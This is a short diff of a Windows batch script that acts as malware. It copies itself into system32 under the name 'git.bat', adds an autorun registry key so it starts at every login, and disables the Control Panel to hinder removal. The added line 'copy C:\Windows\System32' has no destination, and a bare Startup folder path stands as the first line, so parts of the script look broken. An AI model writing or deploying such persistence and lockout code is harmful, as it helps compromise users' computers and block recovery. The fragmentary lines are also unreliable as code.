@@ -1,5 +1,7 @@
 C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
 
+copy C:\Windows\System32 
+
 copy ""%0"" "%SystemRoot%\system32\git.bat"
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Filel" /t REG_SZ /d "%SystemRoot%\system32\git.bat" /f
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f
